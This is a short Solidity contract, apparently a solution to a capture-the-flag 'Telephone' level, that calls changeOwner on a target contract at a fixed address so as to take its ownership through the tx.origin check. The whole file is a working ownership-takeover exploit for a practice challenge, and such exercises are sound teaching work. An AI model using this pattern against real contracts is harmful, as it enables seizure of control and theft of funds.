// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Telephone } from "./Telephone.sol";

contract TelepphoneAttack {
    Telephone telephoneinstance = Telephone(0x8a3B105960FB80Bd56A0978942f3Ca80631123B4);
    constructor(){

    }

    function claim_ownership(address _address) public{
        telephoneinstance.changeOwner(_address);
    }
}